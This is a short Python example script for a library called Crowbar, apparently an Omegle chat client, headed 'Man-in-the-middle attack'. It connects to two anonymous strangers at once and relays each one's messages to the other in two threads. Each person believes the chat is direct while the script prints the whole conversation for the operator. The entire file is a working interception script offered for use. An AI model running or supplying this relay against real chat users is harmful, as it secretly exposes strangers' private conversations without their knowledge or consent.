"""
Crowbar is free software: you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation, 
either version 3 of the License, or (at your option) any later version.

Crowbar is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; 
without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. 
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this code. 
If not, see <https://www.gnu.org/licenses/>. 
"""

"""
Man-in-the-middle attack
using Crowbar
"""

from threading import Thread

from crowbar.api import OmegleClient
from crowbar.events import Event
from crowbar.exceptions import *

client1 = OmegleClient()
print("Client 1: Initialized")

client2 = OmegleClient()
print("Client 2: Initialized")

client1.connect()
print("Client 1: Connected...")

client2.connect()
print("Client 2: Connected...")

def client1_handler():
    while client1.isconnected:

        try:
            event, msg = client1.get_event(60)

            if event == Event.GOTMESSAGE and msg != None:
                print(f"Client 1: Relaying '{msg}' to Client 2")
                client2.send_message(msg)

            if event == Event.CONNECTIONDIED or event == Event.STRANGERDISCONNECTED:
                print("Client 1: Disconnecting...")
                client1.disconnect()
                break
        
        except Exception:
            print("Exception thrown, stopping...")
            break

def client2_handler():
    while client2.isconnected:

        try:
            event, msg = client2.get_event(60)

            if event == Event.GOTMESSAGE and msg != None:
                print(f"Client 2: Relaying '{msg}' to Client 1")
                client1.send_message(msg)

            if event == Event.CONNECTIONDIED or event == Event.STRANGERDISCONNECTED:
                print("Client 2: Disconnecting...")
                client2.disconnect()
                break
        
        except Exception:
            print("Exception thrown, stopping...")
            break

Thread(target=client1_handler, daemon=False).start()
Thread(target=client2_handler, daemon=False).start()